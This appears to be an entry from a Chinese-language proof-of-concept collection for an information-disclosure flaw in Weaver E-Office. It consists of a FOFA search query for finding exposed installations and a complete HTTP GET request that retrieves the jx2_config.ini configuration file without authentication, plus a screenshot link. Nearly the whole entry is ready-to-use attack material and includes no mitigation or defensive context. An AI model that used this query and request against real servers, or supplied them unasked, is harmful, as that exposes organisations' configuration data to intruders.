## 泛微E-Office-jx2_config存在信息泄露漏洞

## fofa
```
app="泛微-EOffice"
```


## poc
```
GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: LOGIN_LANG=cn; PHPSESSID=265e1c6495a3bd40146196a1a42cd8dd
Upgrade-Insecure-Requests: 1

```

![9dc2b5e9b8b6efe4cff7bcc60bf92bdc](https://github.com/wy876/POC/assets/139549762/d2b8c6c2-e4a4-4f78-86f7-59ede170cac6)
